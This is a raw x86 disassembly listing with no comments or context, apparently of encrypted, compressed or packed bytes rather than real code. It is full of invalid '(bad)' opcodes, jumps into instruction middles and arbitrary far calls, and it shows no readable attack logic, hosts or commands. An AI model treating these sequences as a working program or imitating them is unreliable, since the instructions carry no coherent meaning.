  41ec53:	mov    eax,0xd6fd492e
  41ec58:	inc    edi
  41ec59:	jb     0x41ec19
  41ec5b:	push   eax
  41ec5c:	cmp    al,0xb
  41ec5e:	pop    ebx
  41ec5f:	cdq    
  41ec60:	(bad)  
  41ec61:	(bad)  
  41ec63:	aam    0xe7
  41ec65:	lds    edx,FWORD PTR [ebx+0x3]
  41ec68:	shl    BYTE PTR [ebx],1
  41ec6a:	std    
  41ec6b:	test   eax,0xa4db3a4
  41ec70:	rcr    DWORD PTR [esi],1
  41ec72:	das    
  41ec73:	(bad)  
  41ec74:	jae    0x41ec0b
  41ec76:	pushf  
  41ec77:	adc    eax,DWORD PTR [eax]
  41ec79:	mov    al,0xe5
  41ec7b:	fisub  WORD PTR [eax+ebx*1]
  41ec7e:	std    
  41ec7f:	sub    DWORD PTR [edi-0x56],ebx
  41ec82:	xor    al,0xfb
  41ec84:	jecxz  0x41ecfa
  41ec86:	mov    eax,ds:0xdcda20cb
  41ec8b:	jbe    0x41ec85
  41ec8d:	loopne 0x41ec33
  41ec8f:	xchg   sp,ax
  41ec91:	ins    BYTE PTR es:[edi],dx
  41ec92:	std    
  41ec93:	mov    cl,0x2a
  41ec95:	(bad)  
  41ec96:	mov    ds:0x72af80cb,eax
  41ec9b:	enter  0xd507,0x51
  41ec9f:	ds jns 0x41ec24
  41eca2:	imul   esp,DWORD PTR [ebx],0x4f1e8eb
  41eca8:	push   0x5faff102
  41ecad:	retf   
  41ecae:	ror    ebx,0xd4
  41ecb1:	xchg   DWORD PTR [ebp-0x7abd5d49],ecx
  41ecb7:	sbb    ebx,ebp
  41ecb9:	lahf   
  41ecba:	cld    
  41ecbb:	cs in  eax,dx
  41ecbd:	aad    0xdf
  41ecbf:	jmp    0xc8bd35bf
  41ecc4:	jb     0x41ed07
  41ecc6:	xchg   ebx,eax
  41ecc7:	repnz mov es,WORD PTR [edi]
  41ecca:	stos   BYTE PTR es:[edi],al
  41eccb:	or     BYTE PTR ds:[edi+0x35],al
  41eccf:	stc    
  41ecd0:	jmp    0x41ec9f
  41ecd2:	test   al,0x80
  41ecd4:	dec    edi
  41ecd5:	js     0x41ecdb
  41ecd7:	sub    al,0x22
  41ecd9:	(bad)  
  41ecdb:	scas   al,BYTE PTR es:[edi]
  41ecdc:	sbb    bh,BYTE PTR [ecx+0x2a]
  41ecdf:	iret   
  41ece0:	addr16 mov ebp,edi
  41ece3:	fmul   DWORD PTR [eax-0x2f7d58c1]
  41ece9:	mov    cl,0x14
  41eceb:	enter  0x76ed,0x44
  41ecef:	xchg   BYTE PTR [eax-0x25],dl
  41ecf2:	ins    BYTE PTR es:[edi],dx
  41ecf3:	sbb    al,0xeb
  41ecf5:	aad    0xc1
  41ecf7:	xor    DWORD PTR [ebp+0x6a0429bb],ecx
  41ecfd:	(bad)  
  41ecff:	out    0x57,eax
  41ed01:	cmp    BYTE PTR [edi+0x1d],ch
  41ed04:	dec    eax
  41ed05:	dec    esi
  41ed06:	std    
  41ed07:	dec    ecx
  41ed08:	cs in  eax,dx
  41ed0a:	(bad)  
  41ed0b:	xor    esp,DWORD PTR [edx+0x11]
  41ed0e:	js     0x41ecd8
  41ed10:	add    BYTE PTR [ebp+0x4a],ah
  41ed13:	les    esp,FWORD PTR [eax-0x637a2853]
  41ed19:	jno    0x41ed42
  41ed1b:	sub    bl,0xac
  41ed1e:	addr16 jbe 0x41ecc7
  41ed21:	mov    ch,BYTE PTR [edi+ebx*4+0x3870e2be]
  41ed28:	mov    BYTE PTR [ebp+0x14],cl
  41ed2b:	dec    eax
  41ed2c:	jp     0x41edab
  41ed2e:	cmp    eax,0xb0ccec43
  41ed33:	and    ebx,DWORD PTR [ebp+0x70]
  41ed36:	mov    DWORD PTR [ebx],0xdf269bcb
  41ed3c:	sti    
  41ed3d:	jnp    0x41ed3c
  41ed3f:	scas   al,BYTE PTR es:[edi]
  41ed40:	cwde   
  41ed41:	rol    BYTE PTR [ebx],1
  41ed43:	cmp    DWORD PTR [bx+di],edx
  41ed46:	std    
  41ed47:	cmc    
  41ed48:	(bad)  
  41ed49:	jns    0x41ed00
  41ed4b:	fs dec esp
  41ed4d:	call   0x5431:0x4e21c7f0
  41ed54:	xchg   ecx,eax
  41ed55:	inc    eax
  41ed56:	inc    eax
  41ed57:	add    eax,0x4785afeb
  41ed5c:	sub    al,0x5e
  41ed5e:	mov    ebx,0x10f7696
  41ed63:	addr16 inc ebp
  41ed65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed66:	inc    eax
  41ed67:	or     ah,dh
  41ed69:	test   ah,0x2a
  41ed6c:	popa   
  41ed6d:	imul   ebx,DWORD PTR [ebp-0x40],0x94435b53
  41ed74:	mov    edx,0x6be84b05
  41ed79:	adc    BYTE PTR [ebp+0x77d2e711],cl
  41ed7f:	push   eax
  41ed80:	or     eax,DWORD PTR [edi-0x3]
  41ed83:	or     DWORD PTR [edi+0x5f],ebx
  41ed86:	cmp    al,0x66
  41ed88:	dec    esp
  41ed89:	jg     0x41ed0d
  41ed8b:	enter  0x8d2e,0xba
  41ed8f:	ror    BYTE PTR [ecx],cl
  41ed91:	in     eax,0x86
  41ed93:	pop    ecx
  41ed94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed95:	mov    eax,0xfbd27934
  41ed9a:	fwait
  41ed9b:	pop    ebx
  41ed9c:	add    BYTE PTR [eax],dh
  41ed9e:	std    
  41ed9f:	add    DWORD PTR [ebx-0x28],0xd82da26a
  41eda6:	or     ah,BYTE PTR [edx]
  41eda8:	arpl   WORD PTR [esi+0x3d],di
  41edab:	into   
  41edac:	inc    edi
  41edad:	(bad)  
  41edae:	adc    BYTE PTR [ebx+0xd],dl
  41edb1:	sar    ah,0x13
  41edb4:	push   ebx
  41edb5:	daa    
  41edb6:	inc    esi
  41edb7:	xchg   esp,eax
  41edb8:	or     BYTE PTR [esi],0x1f
  41edbb:	enter  0x2032,0x54
  41edbf:	cdq    
  41edc0:	push   eax
  41edc1:	dec    eax
  41edc2:	push   ss
  41edc3:	leave  
  41edc4:	jmp    0x41ee06
  41edc6:	pop    ebp
  41edc7:	dec    edi
  41edc8:	dec    edi
  41edc9:	push   ecx
  41edca:	inc    esi
  41edcb:	dec    edx
  41edcc:	ret    
  41edcd:	fild   WORD PTR ds:0xd7fa1f20
  41edd3:	add    BYTE PTR [esi],bh
  41edd5:	push   es
  41edd6:	std    
  41edd7:	cld    
  41edd8:	jno    0x41ee46
  41edda:	mov    al,0x5f
  41eddc:	cmp    al,0xd
  41edde:	in     eax,dx
  41eddf:	(bad)  
  41ede0:	sbb    BYTE PTR [ebx+edi*4+0x316141c5],cl
  41ede7:	por    mm2,QWORD PTR [ebp+0x77a7aedd]
  41edee:	stc    
  41edef:	imul   eax,DWORD PTR [ebp-0x56fcb515],0xffffff9f
  41edf6:	push   ebx
  41edf7:	jnp    0x41ee65
  41edf9:	push   es
  41edfa:	dec    esi
  41edfb:	mov    ch,0xff
  41edfd:	mov    edi,0xa88fa1ec
  41ee02:	call   FWORD PTR [eax+0x77]
  41ee05:	fnstenv [ebp+0x38]
  41ee08:	out    dx,eax
  41ee09:	data16 mov dh,BYTE PTR [esi-0x3800114e]
  41ee10:	rol    cl,1
  41ee12:	(bad)  
  41ee13:	mov    cl,0x7e
  41ee15:	fcom   DWORD PTR [eax-0x6ae13c7c]
  41ee1b:	enter  0x17d3,0x92
  41ee1f:	xor    BYTE PTR [esp+edi*4+0x5ce9c862],dh
  41ee26:	or     ebx,DWORD PTR [eax]
  41ee28:	mov    cs,WORD PTR [esi-0x211460fb]
  41ee2e:	cmp    al,0x5
  41ee30:	and    esi,esp
  41ee32:	push   edi
  41ee33:	jno    0x41edfb
  41ee35:	fisubr WORD PTR [esi]
  41ee37:	clc    
  41ee38:	aaa    
  41ee39:	cmp    al,0xad
  41ee3b:	test   al,0x81
  41ee3d:	shrd   DWORD PTR [edi],ebx,cl
  41ee40:	loope  0x41ede5
  41ee42:	sub    al,0xc9
  41ee44:	xchg   esp,eax
  41ee45:	jmp    0x17bc:0x99e64aea
  41ee4c:	test   eax,0xd9e68edf
  41ee51:	imul   ebx,DWORD PTR [ebx],0xffffffc4
  41ee54:	mov    bh,0xdc
  41ee56:	cld    
  41ee57:	shr    BYTE PTR [edi-0x27e180ac],cl
  41ee5d:	lods   al,BYTE PTR ds:[esi]
  41ee5e:	pop    edx
  41ee5f:	enter  0x2091,0xe
  41ee63:	jbe    0x41ee96
  41ee65:	sub    ebp,DWORD PTR [ebx-0x6a5d1639]
  41ee6b:	shl    DWORD PTR [ebx+0xd475984],0x7d
  41ee72:	sub    eax,0x3d3ad11d
  41ee77:	iret   
  41ee78:	lahf   
  41ee79:	mov    edi,eax
  41ee7b:	ins    BYTE PTR es:[edi],dx
  41ee7c:	jmp    0x41ee21
  41ee7e:	stos   BYTE PTR es:[edi],al
  41ee7f:	pop    edx
  41ee80:	pop    edx
  41ee81:	inc    edi
  41ee82:	sub    ah,dl
  41ee84:	jmp    0x41eeee
  41ee86:	lods   al,BYTE PTR ds:[esi]
  41ee87:	in     eax,dx
  41ee88:	add    al,0x1d
  41ee8a:	data16 and al,0xdf
  41ee8d:	fistp  QWORD PTR [ecx-0x41]
  41ee90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee91:	mov    dl,BYTE PTR [esi+edx*4-0x5b02fad3]
  41ee98:	mov    BYTE PTR [ecx],0x9f
  41ee9b:	clc    
  41ee9c:	jmp    0x9b46:0xa7c873e2
  41eea3:	xchg   DWORD PTR [ebx-0x138fa3c9],edx
  41eea9:	shl    DWORD PTR [esi-0x504f2684],cl
  41eeaf:	nop
  41eeb0:	adc    eax,edx
  41eeb2:	mov    cl,0x9c
  41eeb4:	pop    ebx
  41eeb5:	loopne 0x41ee5e
  41eeb7:	fs push edi
  41eeb9:	retf   
  41eeba:	push   edi
  41eebb:	mov    eax,0x79f07dae
  41eec0:	jmp    FWORD PTR [ebp-0x2f]
  41eec3:	test   al,0xa8
  41eec5:	fsubr  DWORD PTR [ebp-0x5a]
  41eec8:	sub    al,0x11
  41eeca:	inc    esi
  41eecb:	mov    BYTE PTR [edi],bl
  41eecd:	stc    
  41eece:	xor    bh,BYTE PTR [esi-0x5df7e10d]
  41eed4:	imul   ecx,DWORD PTR [ebp-0x7fe5867c],0xffffffbd
  41eedb:	das    
  41eedc:	jmp    0x41eede
  41eede:	mov    ch,0xd6
  41eee0:	lea    eax,[eax-0x56]
  41eee3:	jne    0x41ee75
  41eee5:	fistp  WORD PTR ds:0xdb1d246
  41eeeb:	add    eax,0xb5f96bc9
  41eef0:	xchg   esp,eax
  41eef1:	aaa    
  41eef2:	sbb    BYTE PTR [eax-0x7cfab0d5],0xc1
  41eef9:	fistp  WORD PTR [esi+eax*4-0x2a8427e8]
  41ef00:	cmp    esi,DWORD PTR [ebx+0x3]
  41ef03:	or     eax,0xbe7cf804
  41ef08:	xor    al,0x3e
  41ef0a:	aam    0xb9
  41ef0c:	xchg   ecx,eax
  41ef0d:	fisubr WORD PTR [eax+edi*4+0x3b711524]
  41ef14:	mov    eax,0xebf0d727
  41ef19:	sub    esp,ebx
  41ef1b:	retf   
  41ef1c:	sbb    al,0xd4
  41ef1e:	fsubr  QWORD PTR [edi+0x6]
  41ef21:	(bad)  
  41ef23:	jbe    0x41ef1e
  41ef25:	and    bh,al
  41ef27:	xchg   ebp,eax
  41ef28:	push   0xffffffb0
  41ef2a:	scas   al,BYTE PTR es:[edi]
  41ef2b:	jmp    0xd2a29e1c
  41ef30:	lods   eax,DWORD PTR ds:[esi]
  41ef31:	sar    BYTE PTR [ebx],0x92
  41ef34:	aaa    
  41ef35:	cmp    cl,BYTE PTR [edx+0x58]
  41ef38:	adc    ebx,DWORD PTR [ebx-0x2b5de5c8]
  41ef3e:	jns    0x41efb9
  41ef40:	xchg   ebx,eax
  41ef41:	jbe    0x41ef40
  41ef43:	std    
  41ef44:	jge    0x41eed8
  41ef46:	mul    BYTE PTR [edi-0x370a13f9]
  41ef4c:	xor    DWORD PTR [edi],esp
  41ef4e:	daa    
  41ef4f:	dec    eax
  41ef50:	rcr    BYTE PTR ds:0xe89bb9be,0xe
  41ef57:	cld    
  41ef58:	mov    DWORD PTR [edi-0x22],ebx
  41ef5b:	aad    0x7
  41ef5d:	ins    DWORD PTR es:[edi],dx
  41ef5e:	mov    ch,ch
  41ef60:	jmp    0x41ef30
  41ef62:	xlat   BYTE PTR ds:[ebx]
  41ef63:	out    0xad,eax
  41ef65:	mov    edi,0x4da98cd5
  41ef6a:	dec    eax
  41ef6b:	enter  0xd729,0xe0
  41ef6f:	out    dx,al
  41ef70:	aaa    
  41ef71:	push   0xe8df4215
  41ef76:	jmp    0x41ef3f
  41ef78:	daa    
  41ef79:	das    
  41ef7a:	dec    esp
  41ef7b:	jmp    0x41ef09
  41ef7d:	sti    
  41ef7e:	mov    esi,0x7cf9e1e2
  41ef83:	mov    edx,DWORD PTR [eax-0x45d125f2]
  41ef89:	(bad)  
  41ef8b:	jg     0x41efaf
  41ef8d:	push   esi
  41ef8e:	inc    edx
  41ef8f:	jle    0x41ef87
  41ef91:	jns    0x41efc1
  41ef93:	sub    al,0xb0
  41ef95:	fbstp  TBYTE PTR [edx-0x75]
  41ef98:	mov    dh,0x72
  41ef9a:	loope  0x41ef79
  41ef9c:	fldenv [ebp-0x34743e04]
  41efa2:	aad    0x6d
  41efa4:	add    al,0xb5
  41efa6:	adc    cl,al
  41efa8:	inc    esp
  41efa9:	pushf  
  41efaa:	std    
  41efab:	pop    ebx
  41efac:	push   esp
  41efad:	add    edi,DWORD PTR [eax+0x66]
  41efb0:	jmp    0x41ef6d
  41efb2:	scas   al,BYTE PTR es:[edi]
  41efb3:	rcr    DWORD PTR [eax+ecx*8],1
  41efb6:	les    esp,FWORD PTR [ecx+0x14]
  41efb9:	jmp    0xdf6a01c8
  41efbe:	es mov esi,0xaeee5ffb
  41efc4:	inc    BYTE PTR [eax]
  41efc6:	xor    al,0x9c
  41efc8:	adc    eax,DWORD PTR [edx-0x14e8731d]
  41efce:	iret   
  41efcf:	dec    ebx
  41efd0:	in     al,dx
  41efd1:	adc    BYTE PTR [ebx+0x4],bh
  41efd4:	mov    edx,0x625accbb
  41efd9:	fbstp  TBYTE PTR [ebx+0x655ea536]
  41efdf:	out    0xa4,eax
  41efe1:	add    al,0xfd
  41efe3:	mov    edi,0x169d7bc5
  41efe8:	push   ss
  41efe9:	(bad)
  41efec:	int3   
  41efed:	adc    dl,ch
  41efef:	sbb    edx,DWORD PTR [ecx-0xaa8cad3]
  41eff5:	mov    DWORD PTR [ebp+0x76],ebx
  41eff8:	out    dx,al
  41eff9:	into   
  41effa:	(bad)  
  41effb:	call   0xe8975dcf
  41f000:	in     eax,0xc4
  41f002:	stc    
  41f003:	(bad)  
  41f004:	jae    0x41f052
  41f006:	jg     0x41efbd
  41f008:	int    0xc
  41f00a:	or     edi,DWORD PTR [ebx+ebp*8]
  41f00d:	mov    ?,WORD PTR [edi-0x69562077]
  41f013:	pushf  
  41f014:	shr    bl,0xd3
  41f017:	daa    
  41f018:	inc    ebx
  41f01a:	fwait
  41f01b:	enter  0xb82d,0x6e
  41f01f:	lods   eax,DWORD PTR ds:[esi]
  41f020:	sbb    DWORD PTR [ecx+eax*1+0x7cc8b2ff],ebx
  41f027:	dec    ecx
  41f028:	xchg   ebx,eax
  41f029:	mov    ch,0x67
  41f02b:	or     DWORD PTR [edi+ebx*8+0x1d301cd1],esi
  41f032:	bound  esp,QWORD PTR [eax-0x33ffae6c]
  41f038:	or     BYTE PTR [edi],0x1d
  41f03b:	jmp    0x41eff6
  41f03d:	push   edi
  41f03e:	inc    ebp
  41f03f:	jae    0x41f059
  41f041:	fild   WORD PTR [ebp-0x451f3fb6]
  41f047:	pop    ecx
  41f048:	aaa    
  41f049:	aad    0xfc
  41f04b:	and    eax,0xac9ddc3a
  41f050:	dec    esp
  41f051:	push   es
  41f052:	or     eax,0x20
  41f055:	ins    DWORD PTR es:[edi],dx
  41f056:	lock lods al,BYTE PTR ds:[esi]
  41f058:	test   BYTE PTR [ebx-0x6c],ah
  41f05b:	fcomp  DWORD PTR [ebx]
  41f05d:	push   ss
  41f05e:	add    al,0xd1
  41f060:	shr    BYTE PTR [ebp+0xbe73b7c],cl
  41f066:	push   esi
  41f067:	add    dl,BYTE PTR [eax+0x37]
  41f06a:	sbb    ecx,eax
  41f06c:	mov    esp,0xc60667c3
  41f071:	(bad)  
  41f072:	rol    al,1
  41f074:	jmp    0x41f0e1
  41f076:	mov    ds:0xa4c80f4b,al
  41f07b:	mov    ecx,eax
  41f07d:	pop    ds
  41f07e:	adc    eax,0x58896e8e
  41f083:	jle    0x41f070
  41f085:	mov    al,0xc6
  41f087:	out    0x59,al
  41f089:	psrld  mm4,QWORD PTR [ecx+0x1b]
  41f08d:	cmp    edx,ebp
  41f08f:	(bad)  
  41f090:	data16 mov ds:0x298fe1cd,al
  41f096:	mov    edx,0xe219af3b
  41f09b:	xchg   esp,eax
  41f09c:	fucom  st(3)
  41f09e:	addr16 dec eax
  41f0a0:	sub    ah,BYTE PTR [eax+0x145694a1]
  41f0a6:	loope  0x41f045
  41f0a8:	add    ax,0xdb95
  41f0ac:	data16 repnz cmc 
  41f0af:	repz arpl di,bp
  41f0b2:	aad    0x89
  41f0b4:	push   esp
  41f0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0b6:	std    
  41f0b7:	call   0x86606ae8
  41f0bc:	repnz sbb bh,BYTE PTR [ecx-0x6d20f5b8]
  41f0c3:	lock xchg BYTE PTR [ecx+0xee4dd5c],bl
  41f0ca:	repz push es
  41f0cc:	hlt    
  41f0cd:	enter  0x8831,0x42
  41f0d1:	mov    ds:0xe07d1850,al
  41f0d6:	mov    esp,esp
  41f0d8:	mov    edx,0xb6e8cd62
  41f0dd:	ins    DWORD PTR es:[edi],dx
  41f0de:	addr16 mov ebp,ebp
  41f0e1:	and    edx,DWORD PTR [esi+0x1]
  41f0e4:	xchg   edi,eax
  41f0e5:	pop    edi
  41f0e6:	pop    esp
  41f0e7:	add    eax,0xc8281f59
  41f0ec:	xchg   esi,eax
  41f0ed:	jmp    0x5005:0xc05ede86
  41f0f4:	jmp    0x41f0ee
  41f0f6:	push   eax
  41f0f7:	stc    
  41f0f8:	icebp  
  41f0f9:	jg     0x41f141
  41f0fb:	push   es
  41f0fc:	pusha  
  41f0fd:	fist   WORD PTR [edx]
  41f0ff:	jp     0x41f096
  41f101:	loope  0x41f0f3
  41f103:	add    esp,DWORD PTR [ecx-0x77]
  41f106:	std    
  41f107:	xchg   ecx,eax
  41f108:	out    dx,al
  41f109:	clc    
  41f10a:	aad    0x41
  41f10c:	inc    ebp
  41f10d:	xor    eax,edx
  41f10f:	enter  0xe5a6,0xaf
  41f113:	ja     0x41f0db
  41f115:	mov    esp,0xc7fd6f64
  41f11a:	or     BYTE PTR [ebx],al
  41f11c:	sub    ebx,DWORD PTR [ebp-0x14]
  41f11f:	loopne 0x41f10d
  41f121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f122:	or     cl,ah
  41f124:	jmp    0x5a1fe023
  41f129:	(bad)  
  41f12a:	std    
  41f12b:	jns    0x41f101
  41f12d:	std    
  41f12e:	push   ebx
  41f12f:	push   ebx
  41f130:	or     eax,0x1e2c3804
  41f135:	fild   QWORD PTR [edx-0x2a8eba1a]
  41f13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f13c:	fstp   TBYTE PTR [edx+0x6c68d3fc]
  41f142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f143:	ins    BYTE PTR es:[edi],dx
  41f144:	xchg   BYTE PTR [edi*2-0x31b43346],ch
  41f14b:	enter  0x358,0x18
  41f14f:	fmul   QWORD PTR [edx]
  41f151:	(bad)  
  41f152:	cld    
  41f153:	push   esi
  41f154:	pop    ebx
  41f155:	push   ss
  41f156:	outs   dx,DWORD PTR ds:[esi]
  41f157:	retf   0xd891
  41f15a:	sbb    al,cl
  41f15c:	xchg   edi,eax
  41f15d:	push   edi
  41f15e:	jb     0x41f170
  41f160:	mov    esp,0xde22e06d
  41f165:	ret    0x4848
  41f168:	and    eax,0xccdbd693
  41f16d:	xchg   ecx,edi
  41f16f:	enter  0xa02e,0x34
  41f173:	cmp    bl,dh
  41f175:	faddp  st(2),st
  41f177:	or     dl,bh
  41f179:	mov    esp,0xc1e589fc
  41f17e:	inc    BYTE PTR [ecx-0x37e952f7]
  41f184:	inc    ebp
  41f185:	sbb    edx,DWORD PTR [eax+0x25]
  41f188:	ret    0x3feb
  41f18b:	xchg   ebx,eax
  41f18c:	jmp    0x41f1f7
  41f18e:	sbb    DWORD PTR [esi+eiz*2+0x55e7c870],ecx
  41f195:	fimul  WORD PTR [esi+0x1e]
  41f198:	(bad)  
  41f199:	(bad)  
  41f19b:	adc    eax,0x44703f79
  41f1a0:	jmp    0x41f159
  41f1a2:	inc    esi
  41f1a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1a4:	push   ss
  41f1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1a6:	sti    
  41f1a7:	mov    edx,0x1100df3f
  41f1ac:	mov    dh,0xfb
  41f1ae:	dec    esp
  41f1af:	cmp    edx,esp
  41f1b1:	push   edi
  41f1b2:	std    
  41f1b3:	inc    ebp
  41f1b4:	popa   
  41f1b5:	inc    edx
  41f1b6:	fsub   DWORD PTR [esi+0x403880b1]
  41f1bc:	pop    esi
  41f1bd:	or     BYTE PTR [esi+0x1e5067fc],bl
  41f1c3:	sbb    cl,BYTE PTR [edi]
  41f1c5:	pop    ds
  41f1c6:	cld    
  41f1c7:	stos   DWORD PTR es:[edi],eax
  41f1c8:	imul   ecx,DWORD PTR [ecx+eiz*1],0x4f
  41f1cc:	jmp    0x41f21a
  41f1ce:	sbb    al,bh
  41f1d0:	out    0xe6,eax
  41f1d2:	cdq    
  41f1d3:	lahf   
  41f1d4:	repz fist WORD PTR ds:0xc2b480b2
  41f1db:	bound  esp,QWORD PTR [ecx+0x44bdfd82]
  41f1e1:	icebp  
  41f1e2:	(bad)  
  41f1e3:	mov    dh,0xe5
  41f1e5:	dec    edi
  41f1e6:	mov    al,0xc8
  41f1e8:	mov    ds:0xf0b5af2f,al
  41f1ed:	pop    edi
  41f1ee:	mov    ?,esi
  41f1f0:	mov    eax,ds:0xc691fd78
  41f1f5:	fs jb  0x41f200
  41f1f8:	repnz adc ecx,ebp
  41f1fb:	enter  0xf9ce,0xc4
  41f1ff:	ja     0x41f1bd
  41f201:	xor    edx,ecx
  41f203:	aaa    
  41f204:	jmp    0x41f1de
  41f206:	hlt    
  41f207:	stos   BYTE PTR es:[edi],al
  41f208:	pop    ebx
  41f209:	into   
  41f20a:	adc    eax,0x9dfa98b
  41f20f:	(bad)  
  41f210:	in     al,dx
  41f211:	inc    edi
  41f212:	and    ecx,ebp
  41f214:	fcmovnbe st,st(0)
  41f216:	mov    WORD PTR [edi-0x15],?
  41f219:	(bad)  
  41f21a:	mov    es,WORD PTR [eax+0x1b]
  41f21d:	sbb    dh,BYTE PTR [ebp-0x9c4d632]
  41f223:	loope  0x41f1d9
  41f225:	mov    bh,BYTE PTR [ebp+0x1f]
  41f228:	div    BYTE PTR [ebx-0x5de9d776]
  41f22e:	cld    
  41f22f:	and    al,0x39
  41f231:	enter  0x27ad,0x7f
  41f235:	into   
  41f236:	mov    ch,0xca
  41f238:	arpl   WORD PTR [eax-0x15bfe5c0],cx
  41f23e:	cmp    al,0x4a
  41f240:	icebp  
  41f241:	ins    BYTE PTR es:[edi],dx
  41f242:	std    
  41f243:	aas    
  41f244:	jge    0x41f281
  41f246:	test   eax,0x1f1ed6d9
  41f24b:	enter  0xcab0,0xff
  41f24f:	adc    BYTE PTR [edx],ch
  41f251:	xchg   ebp,eax
  41f252:	dec    eax
  41f253:	jo     0x41f240
  41f255:	add    cl,BYTE PTR [ebx+ecx*2]
  41f258:	std    
  41f259:	mov    ecx,0xdfa43781
  41f25e:	imul   esi,DWORD PTR ds:0x292b4d26,0x7cfc9905
  41f268:	clc    
  41f269:	outs   dx,BYTE PTR ds:[esi]
  41f26a:	hlt    
  41f26b:	add    BYTE PTR [edi-0x837dc1f],ch
  41f271:	and    DWORD PTR [ebx+0x371d38fe],esi
  41f277:	adc    edi,ebp
  41f279:	std    
  41f27a:	in     al,dx
  41f27b:	jae    0x41f268
  41f27d:	xor    al,0x1d
  41f27f:	retf   0xf864
  41f282:	ret    
  41f283:	mov    edi,0x4e906ee6
  41f288:	mov    dh,0x18
  41f28a:	cmp    eax,0x6c64b905
  41f28f:	ret    
  41f290:	iret   
  41f291:	popa   
  41f292:	bound  eax,QWORD PTR [eax-0x15]
  41f295:	sbb    BYTE PTR [ecx],0x6e
  41f298:	add    DWORD PTR [eax],0x48
  41f29b:	pop    ds
  41f29c:	xor    esp,DWORD PTR [esi+0x1eb3d367]
  41f2a2:	or     DWORD PTR [edx],ebp
  41f2a4:	ins    BYTE PTR es:[edi],dx
  41f2a5:	arpl   WORD PTR [ebp+0x35bfbb31],di
  41f2ab:	jae    0x41f2b2
  41f2ad:	retf   0xddf7
  41f2b0:	jae    0x41f27e
  41f2b2:	push   ecx
  41f2b3:	enter  0xedd0,0x6f
  41f2b7:	xchg   cl,bl
  41f2b9:	fbld   TBYTE PTR [edx]
  41f2bb:	aam    0x85
  41f2bd:	jo     0x41f2d8
  41f2bf:	(bad)  
  41f2c0:	test   al,0xf
  41f2c2:	std    
  41f2c3:	inc    ebx
  41f2c4:	retf   0x3c3d
  41f2c7:	or     eax,0xc87dff25
  41f2cc:	pop    edx
  41f2cd:	popa   
  41f2ce:	or     DWORD PTR [esi],ebp
  41f2d0:	pop    ss
  41f2d1:	adc    dh,BYTE PTR [esi-0x4cdd17e8]
  41f2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2d8:	jge    0x41f319
  41f2da:	mov    ebp,0xec961c1e
  41f2df:	(bad)  
  41f2e0:	retf   
  41f2e1:	leave  
  41f2e2:	push   es
  41f2e3:	or     eax,0xe65adf19
  41f2e8:	(bad)  
  41f2e9:	sti    
  41f2ea:	das    
  41f2eb:	mov    ebx,0x6c2865eb
  41f2f0:	xor    ch,0x4e
  41f2f3:	jno    0x41f329
  41f2f5:	fistp  QWORD PTR [ebp+0x15]
  41f2f8:	mov    dh,0x33
  41f2fa:	inc    ebx
  41f2fb:	mov    ah,BYTE PTR [ebp+0x171afceb]
  41f301:	das    
  41f302:	div    BYTE PTR cs:[eax-0x7375ed0]
  41f309:	mov    eax,0x1779e726
  41f30e:	mov    al,ds:0x3eedeb6f
  41f313:	xor    bh,BYTE PTR [edx]
  41f315:	cmp    bl,BYTE PTR [ebx+0x52]
  41f318:	push   ds
  41f319:	ficomp WORD PTR [esi+0x7c00e8c3]
  41f31f:	into   
  41f320:	scas   al,BYTE PTR es:[edi]
  41f321:	and    ebp,DWORD PTR [edi]
  41f323:	add    ebx,ebp
  41f325:	jne    0x41f374
  41f327:	popf   
  41f328:	sahf   
  41f329:	cmc    
  41f32a:	pop    edi
  41f32b:	jge    0x41f32e
  41f32d:	loopne 0x41f340
  41f32f:	(bad)  
  41f330:	lahf   
  41f331:	mov    ch,0x19
  41f333:	push   ecx
  41f334:	ins    DWORD PTR es:[edi],dx
  41f335:	mov    eax,ds:0x971e1b34
  41f33a:	in     eax,0xc7
  41f33c:	sub    al,0x74
  41f33e:	push   ecx
  41f33f:	lahf   
  41f340:	adc    cl,cl
  41f342:	(bad)  
  41f343:	iret   
  41f344:	xchg   ebx,eax
  41f345:	push   edi
  41f346:	xor    eax,esp
  41f348:	(bad)  
  41f349:	loop   0x41f3bb
  41f34b:	push   edi
  41f34c:	(bad)  
  41f34d:	mov    ebp,0x7eab95d4
  41f352:	cmp    eax,0x6038de77
  41f357:	retf   0xe182
  41f35a:	jp     0x41f372
  41f35c:	sbb    eax,0xa2ae1dd3
  41f361:	dec    ebx
  41f362:	push   0x5953e6b2
  41f367:	and    eax,0xcbad56e7
  41f36c:	ret    0x17a0
  41f36f:	enter  0xe96e,0xa1
  41f373:	push   eax
  41f374:	xor    DWORD PTR [esi-0x35],esp
  41f377:	sbb    bh,bl
  41f379:	or     eax,0x2b694e71
  41f37e:	cmc    
  41f37f:	xchg   edx,eax
  41f380:	(bad)  
  41f381:	pop    edi
  41f382:	inc    eax
  41f383:	mov    dh,0xd4
  41f385:	xchg   edx,eax
  41f386:	and    dh,ch
  41f388:	sbb    al,0xe0
  41f38a:	ffreep st(7)
  41f38c:	sub    edi,DWORD PTR [ecx+0x539fbf2f]
  41f392:	std    
  41f393:	xchg   ebx,eax
  41f394:	ss cwde 
  41f396:	popa   
  41f397:	pop    eax
  41f398:	ret    0xe81e
  41f39b:	enter  0x2caa,0x31
  41f39f:	std    
  41f3a0:	popf   
  41f3a1:	pop    ebp
  41f3a2:	cli    
  41f3a3:	xlat   BYTE PTR ds:[ebx]
  41f3a4:	nop
  41f3a5:	mov    eax,0x4d59e0fc
  41f3aa:	test   al,0x27
  41f3ac:	cmp    DWORD PTR [ebx+0x392acf95],0xffffffde
  41f3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b4:	dec    ebp
  41f3b5:	stos   BYTE PTR es:[edi],al
  41f3b6:	mov    esp,0xd4c4980a
  41f3bb:	inc    eax
  41f3bc:	jmp    0x41f37f
  41f3be:	js     0x41f434
  41f3c0:	xor    ch,BYTE PTR [eax]
  41f3c2:	inc    ebp
  41f3c3:	cmp    al,0x7
